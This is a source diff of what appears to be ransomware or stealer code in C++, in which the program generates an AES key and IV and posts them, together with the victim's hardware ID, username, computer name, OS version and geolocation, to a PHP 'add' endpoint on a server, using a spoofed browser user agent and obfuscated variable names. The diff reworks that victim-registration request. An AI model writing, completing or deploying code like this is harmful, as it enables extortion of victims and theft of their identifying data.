@@ -1,8 +1,6 @@
 #include <iostream>
 #include <thread>
-#include <iomanip>
 #include <fstream>
-#include <sstream>
 
 #include <cryptopp/aes.h>
 #include <cryptopp/osrng.h>
@@ -57,14 +55,11 @@ int main(void) {
 	std::string dbhzgdzdgzm;
 	CryptoPP::StringSource(key.data(), key.size(), true, new CryptoPP::HexEncoder(new CryptoPP::StringSink(ddzdzjd)));
 	CryptoPP::StringSource(iv.data(), iv.size(), true, new CryptoPP::HexEncoder(new CryptoPP::StringSink(dbhzgdzdgzm)));
-	std::string query = "uuid=" + sys.getHwId() + "&username=" + sys.getUsername() + "&computername=" + sys.getComputerName() + "&langId=" + std::to_string(sys.getLangId()) +
-		"&country=" + data[0] + "&region=" + data[3] + "&city=" + data[1] + "&latlong=" + data[2] + "&osversion=" + std::to_string(sys.getOsVersion()) +
-		"&key=" + ddzdzjd + "&iv=" + dbhzgdzdgzm;
-	std::cout << query << std::endl;
 	Http http(L"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.3");
-	http.SendPostRequest(L"localhost", L"/server/hdhohzuag.php?action=add", L"Content-Type: application/x-www-form-urlencoded", to_wstring(query));
+	http.SendPostRequest(L"localhost", L"/server/hdhohzuag.php?action=add", L"Content-Type: application/x-www-form-urlencoded\r\n", "uuid=" + sys.getHwId() + "&username=" + sys.getUsername() + "&computername=" + sys.getComputerName() + "&osversion=" + sys.getOsVersion() + "&country=" + data[0] + "&region=" + data[3] + "&city=" + data[1] + "&key=" + ddzdzjd + "&iv=" + dbhzgdzdgzm + "&latlong=" + data[2] + "&langId=" + sys.getLangId());
 	std::string response = http.GetResponseText();
 	std::cout << response << std::endl;
+	return 1;
 	
 
 	std::vector<std::thread> threads;
